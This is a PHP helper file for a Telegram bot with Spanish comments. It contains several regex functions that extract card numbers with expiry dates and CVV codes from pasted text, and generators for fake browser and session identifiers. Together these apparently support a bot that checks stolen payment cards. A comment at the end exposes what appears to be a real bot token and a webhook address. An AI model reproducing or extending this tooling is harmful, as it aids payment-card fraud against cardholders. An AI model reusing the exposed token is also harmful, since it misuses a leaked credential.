                $idioma_cambiar = 'en';
                
            }
            if($idioma_cambiar == 'en'){
                $idioma_actual = 'es';
                $idioma_cambiar = 'en';
            }
            $text = traducir($text,$idioma_cambiar);
    $telegram->sendMessage([
        'chat_id' => $chatId,
        'reply_to_message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ]);
        
}




function reply_to($chatId,$message_id,$keyboard,$message) {
    global $gId;
      $idioma_cambiar = IdiomaUser($gId);
            if(empty($idioma_cambiar)){
                $idioma_cambiar = 'en';
                
            }
            if($idioma_cambiar == 'en'){
                $idioma_actual = 'es';
                $idioma_cambiar = 'en';
            }
        $message = traducir($message,$idioma_cambiar);
        $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML&reply_markup=".$keyboard."";
        return file_get_contents($url);
}
          

function sendMessage($chatId,$keyboard,$message) {
        
        $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
        file_get_contents($url);
       
}
function sendMessage2($chatId,$keyboard,$message,$message_id) {
       
    $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&message_id=".$message_id."&parse_mode=HTML&reply_markup=".$keyboard."";
    file_get_contents($url);
   
}
function editMessageTex($cchatid2,$keyboard,$message,$message_id2) {
        
    $url = $GLOBALS[website]."/editMessageText?chat_id=".$cchatid2."&text=".$message."&reply_to_message_id=".$message_id2."&parse_mode=HTML";
    file_get_contents($url);
   
}
function answerCallbackQuery($queryid, $text, $show) {
     
    $url = $GLOBALS[website] . '/answerCallbackQuery?callback_query_id=' . $queryid . '&text=' . $text . '&show_alert=' . $show;
    file_get_contents($url);
}

function sendVoice ($chatId,$original) {
       
        $url = $GLOBALS[website]."/sendVoice?chat_id=".$chatId."&voice=".$original."";
        file_get_contents($url);
}
function deleteM ($chatId,$message_id) {
       
        $url = $GLOBALS[website]."/deleteMessage?chat_id=".$chatId."&message_id=".$message_id."";
        file_get_contents($url);
}
function string_between_two_string($str, $starting_word, $ending_word){
$subtring_start = strpos($str, $starting_word);
$subtring_start += strlen($starting_word);
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
return substr($str, $subtring_start, $size);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    if (count($str) < 2) {
        return "null"; 
    }
    $str = explode($end, $str[1]);
    if (count($str) < 2) {
        return "null"; 
    }
    return $str[0];
}


function g($l, $k, $p){
  return explode($p, explode($k, $l)[1])[0];
}
// function gibarray($message){
// 
// }

function capture($string, $start, $end)
{
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	$str = trim(strip_tags($str[0]));
	return $str;
}

function value($str,$find_start,$find_end)
{
     
    $start = @strpos($str,$find_start);
    if ($start === false)
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function Webkit_Post_Data($string, $first, $second, $third, $fourth){
    $result = '';
    $string = urlencode($string);
    $first = urlencode($first);
    $second = urlencode($second);

    for ($i = 1; $i < substr_count($string, $first) + 1; $i++){
      $one = explode($second, explode($first, $string)[$i])[0];
      $two = urlencode(trim(preg_replace('/\s\s+/', '', explode($fourth, explode($third, urldecode($string))[$i])[0])));
      $result .= $one."=".$two.'&';
      };

      return rtrim($result, '&');
  }

function cleansix($string) {
    // Remover los caracteres no numéricos y dejar solamente 16 dígitos consecutivos
    preg_match_all("/(\d{15,16})[\/\s:|]*?(\d{1,2})[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3,4})/", $string, $matches);
    $tarjetas = $matches[0];
    // Devolver las primeras 6 tarjetas limpias, separadas por un salto de línea
    return implode("\n", array_slice($tarjetas, 0, 30));
}

function clea_cc($string) {
    preg_match_all("/(\d{15,16})[\/\s:|]*?(\d{1,2})[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3,4})/", $string, $matches);
    $tarjetas = $matches[0];
    $tarjetas = str_replace(" ", "", $tarjetas); 
    return implode("\n", array_slice($tarjetas, 0, 1));
}

function cleanon($string) {
    preg_match_all("/(\d{15,16})[\/\s:|]*?(\d{1,2})[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3,4})/", $string, $matches);
    $tarjetas = $matches[0];
    $tarjetas = str_replace(" ", "", $tarjetas); 
    return implode("\n", array_slice($tarjetas, 0, 1));
}

function clean($string) {
    preg_match_all("/(\d{15,16})[\/\s:|]*?(\d{1,2})[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3,4})/", $string, $matches);
    $tarjetas = $matches[0];
    $tarjetas = str_replace(" ", "", $tarjetas); 
    return implode("\n", array_slice($tarjetas, 0, 1));
}
function clean5($string) {
     
$text = preg_replace("/\r|\n/", " ", $string);
$str1 = preg_replace('/\s+/', ' ', $text);
$str = preg_replace("/[^0-9x]/", " ", $str1);
$string = trim($str, " ");
$lista = preg_replace('/\s+/', ' ', $string);
         return $lista; 
        }

function clean2($string) {
  $text = preg_replace("/\r|\n/", " ", $string);
     $str1 = preg_replace('/\s+/', ' ', $text); 
$string = trim($str1, " ");
$lista = preg_replace('/\s+/', ' ', $string);
// 
   return $lista; 
}
function clean1($string) {
$str = preg_replace("/[^0-9]/| ![ \x]*//.*[ \x]*!", " ", $string);
   return $str; 
}

function cleean($string) {
$input = preg_replace("/\W/", " ", $string);
$input = preg_replace("/\r|\n/", ' ', $input);
$input = preg_replace("/[^0-9]/", ' ', $input);
$input = preg_replace('/\s+/', ' ', $input);
$input = trim($input, ' ');
return $input; 
}


function RemoveSpecialChar($str) { 
    $res = str_replace(array( '\'', '"', 
    ',' , ';', '<', '>','.' ), '', $str); 
    return $res; 
} 

function GUID(){
if (function_exists('com_create_guid') === true){
return trim(com_create_guid(), '{}');
}
return sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535));
}
function MUID(){
if (function_exists('com_create_muid') === true){
return trim(com_create_muid(), '{}');
}
return sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535));
}

function SID(){
if (function_exists('com_create_sid') === true){
return trim(com_create_sid(), '{}');
}
return sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535), mt_rand(0, 65535));
}
// sendMessage($chatId,$keyboard,$rand);
function edit_message($chatId,$message_id,$keyboard,$message) {
   $url = $GLOBALS[website]."/editMessageText?chat_id=".$chatId."&text=".$message."&message_id=".$message_id."&parse_mode=HTML";
	file_get_contents($url);
}
function editMessage ($chatId, $message,$message_id,$keywords){
global $botToken;
$url = "https://api.telegram.org/bot".$botToken."/editMessageText?chat_id=$chatId&text=$message&message_id=$message_id&parse_mode=HTML&reply_markup=$keywords";
$result = file_get_contents($url);      
}
function botoned ($cchatid2, $message,$cmessage_id2,$keywords){
    global $botToken;
    $url = "https://api.telegram.org/bot".$botToken."/editMessageText?chat_id=$cchaid2&text=$message&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$keywords";
    $result = file_get_contents($url);      
    }
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
}


function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
function mod($dividendo,$divisor) {     return round($dividendo - (floor($dividendo/$divisor)*$divisor));
 }

function gibarray($message){
    // $cuted = substr($message, 6);
    return explode("\n", $message);
}



// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------//



//https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/setWebhook?url=https://c4d6-2600-1f13-415-1900-1189-4117-dea7-601a.ngrok.io/index.php

?>   